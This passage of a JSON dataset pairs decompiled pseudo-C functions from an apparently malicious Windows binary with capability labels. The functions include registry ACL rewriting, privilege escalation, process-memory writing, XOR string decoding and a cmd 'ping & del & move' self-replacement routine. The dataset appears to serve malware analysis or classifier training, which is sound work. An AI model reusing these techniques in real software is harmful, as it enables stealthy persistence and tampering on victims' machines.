puStack108 = 0x40e721;\n                                puStack100 = puVar3;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAce)();\n                                if (iVar1 == 0) goto code_r0x0040e762;\n                                pAceList[1] = 0x80000000;\n                                puStack96 = *(pAceList + 2);\n                                puStack100 = pAceList;\n                                uStack104 = 0xffffffff;\n                                puStack108 = 0x2;\n                                uStack116 = 0x40e743;\n                                uStack112 = uVar2;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_AddAce)();\n                                if (iVar1 == 0) goto code_r0x0040e762;\n                                puVar3 = puVar3 + 1;\n                            } while (puVar3 < pAclInformation);\n                        }\n                        puStack96 = NULL;\n                        uStack104 = 1;\n                        puStack108 = &fcn.0040e667::var_38h;\n                        uStack112 = 0x40e75e;\n                        puStack100 = uVar2;\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)();\n                        if (iVar1 != 0) {\n                            puStack96 = &fcn.0040e667::var_38h;\n                            puStack100 = 0x4;\n                            puStack108 = 0x40e77a;\n                            iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetKeySecurity)();\n                            uStack112 = 0x40e788;\n                            puStack108 = uVar2;\n                            (*_sym.imp.KERNEL32.dll_LocalFree)();\n                            return iVar1 == 0;\n                        }\n                    }\ncode_r0x0040e762:\n                    puStack100 = 0x40e769;\n                    puStack96 = uVar2;\n                    (*_sym.imp.KERNEL32.dll_LocalFree)();\n                    return false;\n                }\n            }\n        }\n    }\n    return false;\n}\n",
        "token_count": 1188
    },
    "0040e791": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040e791(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4108ec;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4108ec;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 419
    },
    "0040e804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040e804(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 109
    },
    "0040e81e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040e81e(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 131
    },
    "0040f9c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f9c9(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 547
    },
    "00401cc7": {
        "rules": [
            "open process",
            "check process job object/8aaf725824be4e7b84101cffc1f879ea"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00401cc7(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.00401606();\n        if (iVar2 != 0) {\n            iVar4 = fcn.00402a0d();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 189
    },
    "0040524b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040524b(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint uVar4;\n    uint *arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    arg_14h = &var_4h;\n    uVar4 = 0;\ncode_r0x004052a4:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040bb4e(in_EDX, 0, &arg_8h, arg_14h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x004052bc:\n            fcn.00407fc3();\n            goto code_r0x004052c3;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.00407fc3();\n            goto code_r0x004052a4;\n        }\n        if (uVar1 < 5) goto code_r0x004052bc;\n        if (*puVar2[1] == uVar1) {\ncode_r0x004052c3:\n            if (*puVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 2\");\n            }\n            else if (puVar2[1] != 0) {\n                fcn.0040de95();\n                iVar3 = fcn.00405172(arg_ch);\n                if (iVar3 != 0) {\n                    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 1\");\n                    fcn.00407fc3();\n                    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41ccbc);\n                    uVar4 = 1;\n                }\n            }\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 497
    },
    "0040b35e": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040b35e(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040a8a7();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040b387();\n    return 0;\n}\n",
        "token_count": 84
    },
    "00407e2c": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nuint fcn.00407e2c(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpBuffer;\n    uint lpString1;\n    uint lpFilename;\n    uint pExecInfo;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hProcess;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n    if ((iVar3 != 0) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(0x4108f0, &lpBuffer, 0x104),  iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"/c ping localhost -n 4 & del /F /Q \\\"\");\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul\");\n        (*pcVar1)(&lpString1, L\"& move /Y \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\".update\\\" \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul & \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, 0x4109a4);\n        var_2ch = &lpBuffer;\n        pExecInfo = 0x3c;\n        var_28h = &lpString1;\n        var_34h = 0;\n        var_30h = 0x4109a8;\n        var_24h = 0;\n        var_20h = 0;\n        var_38h = 0x40;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x100);\n        pcVar1 = _sym.imp.KERNEL32.dll_SetPriorityClass;\n        (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentThread;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0xf);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n        (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n        iVar3 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if (iVar3 != 0) {\n            (*pcVar1)(hProcess, 0x40);\n            (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(hProcess, 1);\n            (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 5, &lpFilename, 0);\n            return 1;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20);\n        (*pcVar1)(uVar4);\n        uVar4 = (*pcVar2)(0);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n    }\n    return 0;\n}\n",
        "token_count": 788
    },
    "0040a7a4": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040a7a4(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41cdd8, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 220
    },
    "0040f950": {
        "rules": [
            "contain loop",
            "write process memory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f950(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < arg_ch) {\n        arg_8h = arg_8h - in_EDX;\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar2 = iVar2 + 1;\n            in_EDX = in_EDX + 1;\n        } while (iVar2 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 192
    },
    "0040d833": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040d833(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "00407d6f": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407d6f(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 453
    },
    "0040de54": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040de54(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040d833();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.00409450();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 188
    }
}